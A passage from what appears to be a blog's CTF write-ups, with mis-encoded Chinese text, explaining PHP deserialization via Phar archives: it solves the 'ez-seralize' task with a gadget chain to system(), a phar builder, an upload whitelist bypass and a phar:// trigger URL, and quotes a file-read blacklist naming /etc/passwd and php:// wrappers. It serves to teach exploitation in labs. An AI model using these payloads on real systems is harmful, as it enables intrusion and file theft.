class_">All_in_one</span>();</span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥å°±æ˜¯è§¦å‘<code>__invoke()</code>äº†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r-&gt;_4ak5ra=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿›å…¥æœ€åä¸€å±‚ï¼Œè¿™é‡Œæˆ‘ä»¬è¯•è¯•ç”¨<code>env</code>èƒ½ä¸èƒ½åœ¨ç¯å¢ƒå˜é‡é‡Œé¢æ‰¾åˆ°flagï¼Œæ³¨æ„ä¼ é€’çš„å‚æ•°å<code>24_SYC.zip</code>å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œphpä¼šè¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œè¦æ”¹æˆ<code>24[SYC.zip</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r-&gt;_4ak5ra-&gt;SamsÄra=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r-&gt;_4ak5ra-&gt;ivory=<span class="string">&#x27;env&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šé¢çš„æ­¥éª¤ç»„åˆï¼Œåºåˆ—åŒ–ä¼ å…¥ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æœ‰çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;Round_And_r0und_019ab5d56b5f7445ac23a67b8736490e&#125;</span><br></pre></td></tr></table></figure><br /><br /><h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><p>æœ‰æ—¶å€™é¢˜ç›®å¹¶æ²¡æœ‰<code>unserialize()</code>æ¥å£è®©payloiadè¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœæ­¤æ—¶å¯ä»¥ä¸Šä¼ pharæ–‡ä»¶ï¼Œæ­é…<code>phar://</code>ä¼ªåè®®å¯ä»¥å¸®åŠ©è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><h3 id="pharæ–‡ä»¶"><a href="#pharæ–‡ä»¶" class="headerlink" title="pharæ–‡ä»¶"></a>pharæ–‡ä»¶</h3><p>pharå½’æ¡£æ–‡ä»¶æœ€æœ‰ç‰¹è‰²çš„ç‰¹ç‚¹æ˜¯å¯ä»¥æ–¹ä¾¿åœ°å°†å¤šä¸ªæ–‡ä»¶åˆ†ç»„ä¸ºä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·ï¼Œpharå½’æ¡£æ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPåº”ç”¨ç¨‹åºåˆ†å‘åˆ°å•ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶è¿è¡Œå®ƒçš„æ–¹æ³•ï¼Œè€Œæ— éœ€å°†å…¶æå–åˆ°ç£ç›˜ä¸­</p><p>pharä¸»è¦ç”±4éƒ¨åˆ†ç»„æˆ</p><h4 id="stub-ï¼špharæ–‡ä»¶æ ‡è¯†"><a href="#stub-ï¼špharæ–‡ä»¶æ ‡è¯†" class="headerlink" title="stub ï¼špharæ–‡ä»¶æ ‡è¯†"></a>stub ï¼špharæ–‡ä»¶æ ‡è¯†</h4><p>æ ¼å¼ä¸º<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶</p><h4 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h4><p>pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<code>meta-data</code>ï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹</p><h4 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h4><p>è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹</p><h4 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h4><p>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</p><br /><h3 id="æ„å»ºpharæ–‡ä»¶"><a href="#æ„å»ºpharæ–‡ä»¶" class="headerlink" title="æ„å»ºpharæ–‡ä»¶"></a>æ„å»ºpharæ–‡ä»¶</h3><p>åˆ›å»ºpharæ–‡ä»¶æ—¶è¦ç¡®ä¿é…ç½®å…è®¸ï¼Œåœ¨<code>php.ini</code>æ–‡ä»¶ä¸­å°†<code>phar.readonly</code>è®¾ç½®ä¸º<code>Off</code>ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹ä»£ç åˆ›å»ºä¸€ä¸ªpharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åˆ›å»º.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$B</span>);<span class="comment">//å¯ä»¥å°†åºåˆ—åŒ–çš„å†…å®¹å†™å…¥meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;function.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸º&quot;test&quot;</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br /><h4 id="æå®¢å¤§æŒ‘æˆ˜2025-ez-seralize"><a href="#æå®¢å¤§æŒ‘æˆ˜2025-ez-seralize" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜2025]ez-seralize"></a>[æå®¢å¤§æŒ‘æˆ˜2025]ez-seralize</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç®€å•çš„è¯»æ–‡ä»¶?</span><br></pre></td></tr></table></figure><p>dirsearchåå¯ä»¥çœ‹åˆ°uploads.phpç›®å½•ï¼Œè¿›å…¥æ˜¯æ–‡ä»¶ä¸Šä¼ é¡µï¼Œæç¤ºä»…æ”¯æŒä¸Šä¼ <code>txt, log, jpg, jpeg, png, zip</code>æ–‡ä»¶ï¼Œå›åˆ°ä¸»é¡µé¢ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥<code>uploads.php</code>ã€<code>index.php</code>è·å–æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//uploads.php</span></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;gz&#x27;</span>];</span><br><span class="line"><span class="variable">$allowedMimes</span> = [</span><br><span class="line">    <span class="string">&#x27;txt&#x27;</span>  =&gt; [<span class="string">&#x27;text/plain&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span>  =&gt; [<span class="string">&#x27;text/plain&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;jpg&#x27;</span>  =&gt; [<span class="string">&#x27;image/jpeg&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;jpeg&#x27;</span> =&gt; [<span class="string">&#x27;image/jpeg&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;png&#x27;</span>  =&gt; [<span class="string">&#x27;image/png&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;zip&#x27;</span>  =&gt; [<span class="string">&#x27;application/zip&#x27;</span>, <span class="string">&#x27;application/x-zip-compressed&#x27;</span>, <span class="string">&#x27;multipart/x-zip&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;gif&#x27;</span>  =&gt; [<span class="string">&#x27;image/gif&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;gz&#x27;</span>   =&gt; [<span class="string">&#x27;application/gzip&#x27;</span>, <span class="string">&#x27;application/x-gzip&#x27;</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$resultMessage</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$originalName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$originalName</span>, PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;File extension not allowed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$mime</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$allowedMimes</span>[<span class="variable">$ext</span>]) || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="variable">$allowedMimes</span>[<span class="variable">$ext</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;MIME type mismatch or not allowed. Detected: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$mime</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$safeBaseName</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^A-Za-z0-9_\-\.]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$originalName</span>));</span><br><span class="line">        <span class="variable">$safeBaseName</span> = <span class="title function_ invoke__">ltrim</span>(<span class="variable">$safeBaseName</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$targetFilename</span> = <span class="title function_ invoke__">time</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$safeBaseName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/log.txt&#x27;</span>, <span class="string">&quot;upload file success: <span class="subst">$targetFilename</span>, MIME: <span class="subst">$mime</span>\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$targetPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$targetFilename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$targetPath</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chmod</span>(<span class="variable">$targetPath</span>, <span class="number">0644</span>);</span><br><span class="line">            <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;success&quot;&gt; File uploaded successfully &#x27;</span>. <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt; Failed to move uploaded file.&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt; Upload error: &#x27;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°ç¡®å®æ˜¯ç™½åå•æœºåˆ¶ï¼Œä¼šå¯¹åç¼€åå’Œæ–‡ä»¶ç±»å‹è¿›è¡ŒåŒ¹é…ï¼Œå¹¶ä¸”ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œå¹¶å°†ä¸Šä¼ è®°å½•å†™å…¥<code>/tmp/log.txt</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="variable">$filename</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$balcklist</span> = [<span class="string">&quot;../&quot;</span>,<span class="string">&quot;%2e&quot;</span>,<span class="string">&quot;..&quot;</span>,<span class="string">&quot;data://&quot;</span>,<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;%0a&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;%0d&quot;</span>,<span class="string">&quot;php://&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/proc/self/environ&quot;</span>,<span class="string">&quot;php:file&quot;</span>,<span class="string">&quot;filter&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$balcklist</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;no no no&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$error</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialized&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line">            <span class="variable">$file_contents</span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_contents</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$error</span> = <span class="string">&quot;Failed to read seraizlie file or file does not exist: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="variable">$file_contents</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_contents</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$error</span> = <span class="string">&quot;Failed to read file or file does not exist: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="variable">$file_contents</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯»å–çš„é¡µé¢ä¹Ÿæœ‰é»‘åå•ï¼Œä¸»è¦æ˜¯å±è”½äº†ä¸€äº›phpä¼ªåè®®ï¼Œåœ¨è¿™é‡Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªfunction.phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŸ¥è¯¢æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//function.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;-</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce_me</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rce_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag/flag.txt &gt; /tmp/flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ï¼Œåˆ©ç”¨é“¾çš„é€»è¾‘æ˜¯<code>__wakeup()</code>-&gt;<code>__toString</code>-&gt;<code>__invoke()</code>-&gt;<code>rce_me()</code>ï¼Œå¯ä»¥å¾ˆç®€å•æ„é€ å‡ºpayload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//rce_me()&lt;-__invoke()&lt;-__toString()&lt;-__wakeup()</span></span><br><span class="line"><span class="variable">$B</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$B</span>-&gt;test=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$B</span>-&gt;test-&gt;luo=<span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$B</span>-&gt;test-&gt;luo-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡æœ‰<code>unserialize()</code>è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œpayloadçš„ç”¨å¤„å°±æ— ä»è°ˆèµ·ï¼Œç»“åˆæ–‡ä»¶ä¸Šä¼ å’Œæ— <code>unserialize()</code>çš„é¢˜ç›®ç¯å¢ƒï¼Œè¿™é‡Œåº”è¯¥æ˜¯åˆ©ç”¨pharä¼ªåè®®æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè€Œä¸”<code>index.php</code>æ²¡æœ‰è¿‡æ»¤pharä¼ªåè®®ä¹Ÿå°è¯äº†è¿™ä¸€ç‚¹ï¼Œå°†æˆ‘ä»¬çš„é“¾æ‰“åŒ…æˆpharå‹ç¼©åŒ…</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åˆ›å»º.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$B</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;function.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//å‹ç¼©æ–‡ä»¶éšä¾¿æ”¾</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ çš„æ¥å£è¿›è¡Œä¸Šä¼ ï¼Œè¿™é‡Œè¦ç®€å•æˆªåŒ…ä¿®æ”¹æ–‡ä»¶åå’Œæ–‡ä»¶ç±»å‹ç»•è¿‡ç™½åå•ï¼Œè¿™é‡Œæ–‡ä»¶åæ”¹æˆ<code>phar.zip</code>ï¼Œæ–‡ä»¶ç±»å‹ç›¸åº”ä¿®æ”¹<code>application/zip</code></p><p>æ–‡ä»¶ä¸Šä¼ åä¼šè¢«é‡å‘½åï¼Œä¸èƒ½ç›´æ¥ä¾é <code>phar.zip</code>è®¿é—®ï¼Œæ³¨æ„åˆ°<code>uploads.php</code>æ¯æ¬¡ä¸Šä¼ å®Œæˆéƒ½ä¼šå°†ä¿®æ”¹åçš„æ–‡ä»¶åå†™å…¥<code>log.txt</code>ï¼Œå°è¯•åˆ©ç”¨<code>index.php</code>è·å–<code>log.txt</code>çš„ä¿¡æ¯ï¼Œç¡®å®å¯ä»¥çœ‹åˆ°ä¸Šä¼ åçš„æ–‡ä»¶åç§°</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">upload file success: 1763128085_phar.zip, MIME: application/zip</span><br></pre></td></tr></table></figure><p>å°è¯•ä½¿ç”¨pharä¼ªåè®®è®¿é—®ï¼Œæˆ‘ä»¬ä¸ºäº†ååºåˆ—åŒ–è¿˜éœ€è¦<code>index.php</code>åŒ…å«<code>function.php</code>ï¼Œè¿™é‡Œéœ€è¦é¢å¤–å¸¦ä¸€ä¸ª<code>serialized</code>å‚æ•°</p><p>ä¼ å‚<code>?filename=phar://./uploads/1763128085_phar.zip/function.txt&amp;serialized=1</code></p><p>é¡µé¢å›æ˜¾<code>Success!</code>ï¼Œè¯´æ˜æ­¤æ—¶<code>function.php</code>é‡Œçš„<code>system(&quot;cat /flag/flag.txt &gt; /tmp/flag&quot;);</code>ä¹ŸåŒæ—¶æ‰§è¡Œäº†ï¼Œå›åˆ°é¢˜ç›®é¦–é¡µæŸ¥æ‰¾æ–‡ä»¶<code>/tmp/flag</code>ï¼Œå³å¯è·å¾—flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;019a8289d2ce7e2facdfdcb68ea73edb&#125;</span><br></pre></td></tr></table></figure><br />]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup of PHPSerializelabs</title>
      <link href="/2025/11/23/Writeup-of-PHPSerializelabs/"/>
      <url>/2025/11/23/Writeup-of-PHPSerializelabs/</url>
      
        <content type="html"><![CDATA[<h1 id="Writeup-of-PHPSerializelabs"><a href="#Writeup-of-PHPSerializelabs" class="headerlink" title="Writeup of PHPSerializelabs"></a>Writeup of PHPSerializelabs</h1><p>ååºåˆ—åŒ–é¶åœº<code>PHPSerializelabs</code>çš„ä¸ªäººWp</p><br /><h3 id="Level-1-ç±»çš„å®ä¾‹åŒ–"><a href="#Level-1-ç±»çš„å®ä¾‹åŒ–" class="headerlink" title="Level 1: ç±»çš„å®ä¾‹åŒ–"></a>Level 1: ç±»çš„å®ä¾‹åŒ–</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 1 : ç±»çš„å®ä¾‹åŒ– --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINTï¼šå°å®ä¾‹åŒ–ä¸‹é¢çš„FLAGç±»å§ï¼</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   